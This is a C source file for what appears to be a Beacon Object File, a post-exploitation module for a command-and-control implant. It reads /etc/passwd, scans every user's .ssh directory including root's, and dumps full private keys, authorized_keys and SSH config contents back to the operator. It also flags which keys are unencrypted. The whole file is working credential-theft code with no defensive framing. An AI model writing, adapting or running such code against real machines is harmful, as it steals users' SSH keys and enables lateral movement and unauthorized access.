/// ssh_keys.c — BOF: Scan all users for SSH private keys, configs, known_hosts
/// Compile: gcc -c -o ssh_keys.o ssh_keys.c -include bof_api.h -Os -fPIC
/// Usage: execute bof ssh_keys.o

// getdents64 record structure
struct linux_dirent64 {
    unsigned long long d_ino;
    long long          d_off;
    unsigned short     d_reclen;
    unsigned char      d_type;
    char               d_name[];
};

#define DT_DIR 4
#define DT_REG 8

static void scan_ssh_dir(const char *homedir, const char *username) {
    char ssh_path[512];
    AxSnprintf(ssh_path, sizeof(ssh_path), "%s/.ssh", homedir);

    int fd = AxOpenDir(ssh_path);
    if (fd < 0) return;

    BeaconPrintf(CALLBACK_OUTPUT, "\n[+] User: %s (%s/.ssh/)\n", username, homedir);

    char dirbuf[4096];
    int found_keys = 0;

    while (1) {
        int nread = AxReadDir(fd, dirbuf, sizeof(dirbuf));
        if (nread <= 0) break;

        int pos = 0;
        while (pos < nread) {
            struct linux_dirent64 *entry = (struct linux_dirent64 *)(dirbuf + pos);
            char *name = entry->d_name;

            // Skip . and ..
            if (name[0] == '.' && (name[1] == '\0' || (name[1] == '.' && name[2] == '\0'))) {
                pos += entry->d_reclen;
                continue;
            }

            char filepath[768];
            AxSnprintf(filepath, sizeof(filepath), "%s/%s", ssh_path, name);

            // Check if it's a private key file
            int is_privkey = 0;
            if (AxStrcmp(name, "id_rsa") == 0 ||
                AxStrcmp(name, "id_ed25519") == 0 ||
                AxStrcmp(name, "id_ecdsa") == 0 ||
                AxStrcmp(name, "id_dsa") == 0) {
                is_privkey = 1;
            }

            // Also detect non-standard key names by reading header
            if (!is_privkey && entry->d_type == DT_REG) {
                char header[64];
                int hfd = AxOpenFile(filepath, 0, 0);
                if (hfd >= 0) {
                    int n = AxReadFile(hfd, header, 63);
                    AxCloseFile(hfd);
                    if (n > 30) {
                        header[n] = '\0';
                        if (AxStrstr(header, "PRIVATE KEY") != (char *)0) {
                            is_privkey = 1;
                        }
                    }
                }
            }

            if (is_privkey) {
                // Read and dump the private key
                char *key_data = (char *)0;
                int key_len = AxReadFileToBuffer(filepath, &key_data, 65536);
                if (key_len > 0 && key_data) {
                    // Check if encrypted
                    int encrypted = 0;
                    if (AxStrstr(key_data, "ENCRYPTED") != (char *)0)
                        encrypted = 1;

                    BeaconPrintf(CALLBACK_OUTPUT, "  [KEY] %s (%d bytes)%s\n",
                                 name, key_len, encrypted ? " [ENCRYPTED]" : " [UNENCRYPTED]");
                    BeaconOutput(CALLBACK_OUTPUT, key_data, key_len);
                    BeaconOutput(CALLBACK_OUTPUT, "\n", 1);
                    found_keys++;
                    AxFree(key_data);
                }
            } else if (AxStrcmp(name, "authorized_keys") == 0) {
                // Show authorized keys (who can login)
                char *ak_data = (char *)0;
                int ak_len = AxReadFileToBuffer(filepath, &ak_data, 65536);
                if (ak_len > 0 && ak_data) {
                    // Count keys
                    int nkeys = 0;
                    for (int i = 0; i < ak_len; i++) {
                        if (ak_data[i] == '\n') nkeys++;
                    }
                    if (ak_len > 0 && ak_data[ak_len - 1] != '\n') nkeys++;

                    BeaconPrintf(CALLBACK_OUTPUT, "  [AUTH] authorized_keys (%d keys)\n", nkeys);
                    BeaconOutput(CALLBACK_OUTPUT, ak_data, ak_len);
                    BeaconOutput(CALLBACK_OUTPUT, "\n", 1);
                    AxFree(ak_data);
                }
            } else if (AxStrcmp(name, "known_hosts") == 0) {
                unsigned int mode = 0;
                long fsize = 0;
                if (AxFileStat(filepath, &mode, &fsize, (unsigned int *)0, (unsigned int *)0) == 0) {
                    BeaconPrintf(CALLBACK_OUTPUT, "  [HOSTS] known_hosts (%ld bytes)\n", fsize);
                }
            } else if (AxStrcmp(name, "config") == 0) {
                // SSH config can reveal internal hosts, jump proxies, etc.
                char *cfg_data = (char *)0;
                int cfg_len = AxReadFileToBuffer(filepath, &cfg_data, 65536);
                if (cfg_len > 0 && cfg_data) {
                    BeaconPrintf(CALLBACK_OUTPUT, "  [CONFIG] config (%d bytes)\n", cfg_len);
                    BeaconOutput(CALLBACK_OUTPUT, cfg_data, cfg_len);
                    BeaconOutput(CALLBACK_OUTPUT, "\n", 1);
                    AxFree(cfg_data);
                }
            }

            pos += entry->d_reclen;
        }
    }
    AxCloseFile(fd);

    if (found_keys == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "  (no private keys found)\n");
    }
}

void go(char *args, int args_len) {
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Scanning SSH keys for all users...\n");

    // Parse /etc/passwd to find home directories
    char *passwd = (char *)0;
    int passwd_len = AxReadFileToBuffer("/etc/passwd", &passwd, 524288);
    if (passwd_len <= 0 || !passwd) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to read /etc/passwd\n");
        return;
    }

    int users_scanned = 0;
    int total_keys = 0;
    char *line = passwd;

    while (line < passwd + passwd_len) {
        char *eol = line;
        while (eol < passwd + passwd_len && *eol != '\n')
            eol++;

        // Parse passwd line: username:x:uid:gid:gecos:homedir:shell
        int field = 0;
        char *username = line;
        int username_len = 0;
        char *homedir = (char *)0;
        int homedir_len = 0;
        char *shell = (char *)0;
        int shell_len = 0;
        char *field_start = line;

        for (char *p = line; p <= eol; p++) {
            if (p == eol || *p == ':') {
                if (field == 0) {
                    username = field_start;
                    username_len = (int)(p - field_start);
                } else if (field == 5) {
                    homedir = field_start;
                    homedir_len = (int)(p - field_start);
                } else if (field == 6) {
                    shell = field_start;
                    shell_len = (int)(p - field_start);
                }
                field++;
                field_start = p + 1;
            }
        }

        // Skip system accounts with nologin/false shells (but keep root)
        int skip = 0;
        if (shell && shell_len > 0) {
            // Check last component of shell path
            if (shell_len >= 7 && AxStrncmp(shell + shell_len - 7, "nologin", 7) == 0)
                skip = 1;
            if (shell_len >= 5 && AxStrncmp(shell + shell_len - 5, "false", 5) == 0)
                skip = 1;
        }

        // Always scan root regardless of shell
        if (username_len == 4 && AxStrncmp(username, "root", 4) == 0)
            skip = 0;

        if (!skip && homedir && homedir_len > 0 && homedir_len < 256) {
            char home_buf[512];
            AxMemcpy(home_buf, homedir, homedir_len);
            home_buf[homedir_len] = '\0';

            char uname_buf[256];
            if (username_len > 255) username_len = 255;
            AxMemcpy(uname_buf, username, username_len);
            uname_buf[username_len] = '\0';

            scan_ssh_dir(home_buf, uname_buf);
            users_scanned++;
        }

        line = eol + 1;
    }

    AxFree(passwd);
    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Scanned %d user(s)\n", users_scanned);
}
